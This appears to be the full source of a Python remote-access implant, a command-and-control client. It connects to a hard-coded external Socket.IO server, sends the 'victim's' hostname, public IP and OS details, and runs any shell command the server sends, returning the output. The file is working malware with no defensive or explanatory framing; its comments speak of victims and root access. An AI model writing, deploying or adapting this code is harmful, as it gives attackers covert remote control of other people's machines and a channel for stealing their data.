import socket
import os
import sys
import logging
import requests
import time
import socketio
import subprocess

# Configure logging
logging.basicConfig(level=logging.DEBUG)

# SocketIO Client
sio = socketio.Client()

# Get the public IP address using an external service
def get_public_ip():
    try:
        response = requests.get("https://api64.ipify.org?format=text", timeout=5)
        return response.text.strip()
    except requests.RequestException:
        return "Unknown"

# Connect to C2 server
def connect_to_c2():
    server_url = "wss://283b463e-5d7f-4214-b9aa-aead1caf1978.e1-us-east-azure.choreoapps.dev"
    sio.connect(server_url)

# Event: Successfully connected to C2 server
@sio.event
def connect():
    logging.debug("Successfully connected to C2 server.")
    
    # Gather system info
    victim_info = {
        "hostname": os.uname().nodename,
        "ip_address": get_public_ip(),  # Get public IP
        "os": os.uname().sysname,
        "os_version": os.uname().version,
        "sid": None  # SID will be assigned by the C2 server
    }
    
    # Send victim info to C2 server
    logging.debug(f"Sending system info to C2 server: {victim_info}")
    sio.emit("victim_info", victim_info)

# Event: Command to be executed
@sio.event
def execute_command(data):
    command = data['command']
    logging.debug(f"Received command: {command}")
    
    # Run the command directly (since it's already root)
    try:
        # Use subprocess.PIPE to capture output in real-time
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()  # Wait for the command to complete and get output

        # Decode the output and error (if any)
        output = stdout.decode() + stderr.decode()
        logging.debug(f"Command output: {output}")
        
        # Send the command output back to C2 server
        sio.emit('command_output', {'hostname': os.uname().nodename, 'output': output})
    except Exception as e:
        logging.error(f"Error executing command {command}: {e}")
        sio.emit('command_output', {'hostname': os.uname().nodename, 'output': f"Error executing command: {e}"})

# Event: Disconnected from C2 server
@sio.event
def disconnect():
    logging.debug("Disconnected from C2 server.")
    sys.exit(0)

# Main function
if __name__ == "__main__":
    try:
        # Attempt to connect to the C2 server
        logging.debug("Attempting to connect to C2 server at wss://283b463e-5d7f-4214-b9aa-aead1caf1978.e1-us-east-azure.choreoapps.dev")
        connect_to_c2()

        # Keep the victim running until interrupted
        while True:
            time.sleep(1)  # Keep the connection alive
    except Exception as e:
        logging.error(f"An error occurred: {e}")
        sys.exit(1)
